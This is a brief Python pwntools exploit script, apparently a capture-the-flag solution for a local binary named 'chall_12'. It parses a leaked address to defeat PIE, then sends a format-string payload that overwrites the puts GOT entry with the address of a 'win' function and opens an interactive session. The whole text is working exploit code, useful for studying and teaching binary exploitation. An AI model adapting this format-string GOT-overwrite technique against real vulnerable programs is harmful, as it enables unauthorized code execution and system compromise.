from pwn import *
p=process("./chall_12")
binary = elf=ELF("./chall_12")
p.recvuntil("Sometimes life gets hard, here's some help: ")
_ = p.recvline().strip()
leak = int(_,16)
import re
main = 0x012ef
binary.address = leak - main
payload = fmtstr_payload(7, {binary.got.puts: binary.sym.win }, write_size='byte')
p.sendline(payload)
p.interactive()
